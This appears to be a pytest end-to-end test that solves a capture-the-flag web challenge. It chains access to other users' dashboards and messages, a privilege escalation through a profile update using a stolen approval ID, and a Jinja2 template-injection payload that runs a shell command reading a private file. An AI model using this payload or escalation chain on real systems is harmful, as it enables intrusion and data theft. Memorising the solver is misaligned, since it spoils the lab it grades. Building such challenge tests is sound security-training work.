"""End-to-end tests for the approved firmdrama API chain."""

import re

from helpers import session_login as login


FLAG_PATTERN = re.compile(r"duck\{[a-z]{24}\}")


def test_full_api_only_chain_reaches_both_flags(client):
    headers, user = login(client)
    calendar = client.get("/api/v1/bookings/calendar", headers=headers)
    calendar_dashboard_ids = {item["booking_id"]: item["dashboard_id"] for item in calendar.get_json()["bookings"]}
    assert calendar_dashboard_ids == {7001: 1042, 7002: 1001}
    booking = next(item for item in calendar.get_json()["bookings"] if item["booking_id"] == 7001)
    dashboard_id = booking["dashboard_id"]
    dashboard = client.get(f"/api/v1/dashboards/{dashboard_id}", headers=headers)
    assert dashboard.status_code == 200
    assert dashboard.get_json()["owner"] == {"id": 2, "display_name": "James", "role_id": 3, "role_name": "Senior Partner"}

    conversations = client.get(f"/api/v1/dashboards/{dashboard_id}/conversations", headers=headers).get_json()["conversations"]
    assert len(conversations) == 1
    conversation_id = conversations[0]["conversation_id"]
    assert conversations[0]["message_count"] >= 5
    detail = client.get(f"/api/v1/dashboards/{dashboard_id}/conversations/{conversation_id}", headers=headers).get_json()
    assert len(detail["messages"]) >= 5
    assert all("role_id" not in item and "body" not in item for item in detail["messages"])
    assert all("approval ID:" not in item["body_preview"] for item in detail["messages"])
    flag_previews = [item["body_preview"] for item in detail["messages"] if "duck{" in item["body_preview"]]
    assert len(flag_previews) == 1
    assert flag_previews[0].endswith("duck{")
    assert not FLAG_PATTERN.search(flag_previews[0])

    message_details = [client.get(f"/api/v1/dashboards/{dashboard_id}/conversations/{conversation_id}/messages/{item['message_id']}", headers=headers).get_json() for item in detail["messages"]]
    assert {item["metadata"]["sender_role_id"] for item in message_details} == {3, 499}
    intermediate_flags = [FLAG_PATTERN.search(item["body"]) for item in message_details if item["sender"]["display_name"] == "Olivia"]
    assert sum(flag is not None for flag in intermediate_flags) == 1
    intermediate_flag = next(flag.group(0) for flag in intermediate_flags if flag)
    assert intermediate_flags[-1] is not None
    assert all("duck{" not in item["body"] for item in message_details if item["sender"]["display_name"] == "James")
    approval = re.search(r"approval ID: (dleg_[A-Za-z0-9_-]+)", message_details[-1]["body"])
    assert approval
    assert message_details[-1]["body"].index(intermediate_flag) < message_details[-1]["body"].index(approval.group(0))

    escalation = client.patch(f"/api/v1/users/{user['id']}/profile", headers=headers, json={"role_id": 499, "delegation_approval_id": approval.group(1)})
    assert escalation.status_code == 200
    assert escalation.get_json()["role_id"] == 499
    assert client.get("/api/v3/dashboard", headers=headers).status_code == 200
    assert client.get("/api/v2/dashboard", headers=headers).status_code == 404
    assert client.get("/api/v1/dashboard", headers=headers).status_code == 200
    payload = {"body": "{{ cycler.__init__.__globals__.os.popen('cat /home/olivia/DoNotOpenThisFolder/olivia.txt').read() }}"}
    final_response = client.post("/api/v1/tickets/1001/preview", headers=headers, json=payload)
    final_flag = FLAG_PATTERN.search(final_response.get_json()["preview_html"])
    assert final_response.status_code == 200 and final_flag is not None
    assert intermediate_flag != final_flag.group(0)
